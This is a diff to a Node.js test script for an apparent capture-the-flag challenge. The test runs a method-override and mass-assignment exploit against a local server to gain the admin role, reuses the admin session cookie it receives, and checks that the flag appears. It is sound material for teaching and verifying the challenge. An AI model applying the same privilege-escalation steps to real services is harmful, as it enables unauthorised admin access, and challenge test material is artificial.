@@ -4,7 +4,7 @@ const assert = require("assert");
 
 const PORT = 3917 + Math.floor(Math.random() * 400);
 const BASE = `http://127.0.0.1:${PORT}`;
-const FLAG = "flag{verify_method_override_mass_assignment}";
+const FLAG = process.env.FLAG || "flag{verify_method_override_mass_assignment}";
 
 function request(method, path, body = "", headers = {}) {
   return new Promise((resolve, reject) => {
@@ -77,8 +77,9 @@ async function main() {
     assert.strictEqual(exploit.status, 200, "legacy override should route to PATCH");
     assert.match(exploit.body, /"mode": "legacy-patch"/, "legacy mode should be visible in API response");
     assert.match(exploit.body, /"role": "admin"/, "mass assignment should update role");
+    const adminCookie = exploit.headers["set-cookie"][0].split(";")[0];
 
-    const flagPage = await request("GET", "/admin", "", { Cookie: cookie });
+    const flagPage = await request("GET", "/admin", "", { Cookie: adminCookie });
     assert.strictEqual(flagPage.status, 200, "admin page should open after exploit");
     assert.match(flagPage.body, new RegExp(FLAG), "flag should be visible");
 
